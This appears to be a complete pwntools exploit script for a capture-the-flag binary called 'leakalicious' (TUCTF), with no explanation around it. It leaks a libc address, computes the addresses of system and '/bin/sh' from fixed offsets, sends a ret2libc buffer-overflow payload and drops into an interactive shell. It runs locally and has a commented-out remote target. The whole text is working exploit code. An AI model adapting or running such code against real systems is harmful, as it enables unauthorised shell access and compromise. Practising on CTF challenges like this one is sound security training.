#!/usr/bin/env python2

from pwn import *

#context.log_level = 'debug'

p = process('./leakalicious')
#p = remote('chal.tuctf.com', 30505)

gdb.attach(p)

p.sendlineafter('handle?', 'A' * (32 - len('\n')))
address = u32(p.recvuntil('What... ').split('\n')[2].replace('?', '').ljust(4, '\x00')) - 0x00067b40
print(hex(address))

system = address + 0x0003d200
binsh = address + 0x17e0cf
ret = address + 0x000417

print hex(system)

payload = p32(0)*10+'kkkk'+p32(system)+p32(binsh)+p32(binsh)

p.sendlineafter('exploit?', payload)

p.interactive()
